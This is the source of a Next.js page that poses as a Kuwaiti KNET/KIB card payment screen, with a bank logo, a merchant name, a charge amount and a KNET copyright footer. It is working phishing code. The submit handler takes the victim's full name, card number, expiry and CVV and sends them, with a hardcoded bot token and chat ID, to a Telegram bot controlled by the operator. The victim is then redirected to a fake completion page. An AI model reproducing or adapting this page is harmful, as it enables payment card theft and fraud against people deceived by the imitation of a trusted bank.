"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";
import axios from "axios";
import kibLogo from "../../../public/kib.jpg";
import styles from './page.module.css';

export default function KnetPage() {
  const [fullName, setFullName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expMonth, setExpMonth] = useState("");
  const [expYear, setExpYear] = useState("");
  const [cvv, setCvv] = useState("");
  const router = useRouter();

  const handleSend = async () => {
    if (
      fullName.trim() === "" ||
      cardNumber.trim() === "" ||
      expMonth.trim() === "" ||
      expYear.trim() === "" ||
      cvv.trim() === ""
    ) {
      alert("من فضلك املئ الحقول");
      return;
    }

    const text = `
%0A🏦 بنك برقان
👤 الاسم الكامل: ${fullName}%0A
💳 رقم البطاقة: ${cardNumber}%0A
📅  شهر: ${expMonth}%0A
📅  سنة: ${expYear}%0A
🔐 CVV: ${cvv}
    `;

    try {
      await axios.post(
        `https://api.telegram.org/bot8391195305:AAF-UCHdFDY2uR1cZI8-DOgEt59z849fq20/sendMessage?chat_id=5714216192&text=${text}`
      );
      router.push(`/kpay/finish?name=${cardNumber}`);
    } catch (error) {
      alert("حدث خطأ أثناء الإرسال");
      console.error(error);
    }
  };

  return (
    <div className={styles.knetContainer}>
      <div className={styles.knetBox}>
        <div className={styles.knetHeader}>
          <Image src={kibLogo} alt="KIB Logo" className={styles.knetLogo} />
        </div>

        <div className={styles.knetInfo}>
          <div className={styles.knetInfoRow}>
            <span className={styles.knetInfoLabel}>Merchant:</span>
            <span>Tap Payments EPSP</span>
          </div>
          <div className={styles.knetInfoRow}>
            <span className={styles.knetInfoLabel}>Amount:</span>
            <span>KD 38.368</span>
          </div>
        </div>

        <form
          onSubmit={(e) => {
            e.preventDefault();
            handleSend();
          }}
          className={styles.knetForm}
        >
          <div>
            <label className={styles.formLabel}>Full Name:</label>
            <div className={styles.cardInput}>
              <input
                type="text"
                maxLength="100"
                value={fullName}
                onChange={(e) => setFullName(e.target.value)}
                required
                className={styles.formInput}
              />
            </div>
          </div>
          <hr />

          <div>
            <label className={styles.formLabel}>Card Number:</label>
            <div className={styles.cardInput}>
              <input
                type="text"
                maxLength="16"
                value={cardNumber}
                onChange={(e) => setCardNumber(e.target.value)}
                required
                className={styles.formInput}
              />
            </div>
          </div>
          <hr />

          <div>
            <label className={styles.formLabel}>Expiration Date:</label>
            <div className={styles.expRow}>
              <select
                className={styles.formInput}
                value={expMonth}
                onChange={(e) => setExpMonth(e.target.value)}
                required
              >
                <option value="">MM</option>
                {[...Array(12)].map((_, i) => {
                  const m = String(i + 1).padStart(2, "0");
                  return (
                    <option key={m} value={m}>
                      {m}
                    </option>
                  );
                })}
              </select>
              <select
                className={styles.formInput}
                value={expYear}
                onChange={(e) => setExpYear(e.target.value)}
                required
              >
                <option value="">YYYY</option>
                {[2025, 2026, 2027, 2028].map((year) => (
                  <option key={year} value={year}>
                    {year}
                  </option>
                ))}
              </select>
            </div>
          </div>
          <hr />

          <div>
            <label className={styles.formLabel}>CVV:</label>
            <input
              type="password"
              maxLength="4"
              value={cvv}
              onChange={(e) => setCvv(e.target.value)}
              required
              className={styles.formInput}
            />
          </div>
          <hr />

          <div className={styles.buttonRow}>
            <button
              type="button"
              className={styles.cancel}
              onClick={() => router.back()}
            >
              Cancel
            </button>
            <button type="submit" className={styles.submit}>
              Submit
            </button>
          </div>
        </form>

        <div className={styles.knetFooter}>
          <p>All Rights Reserved. Copyright 2025 ©</p>
          <a href="#">The Shared Electronic Banking Services Company - KNET</a>
        </div>
      </div>
    </div>
  );
}
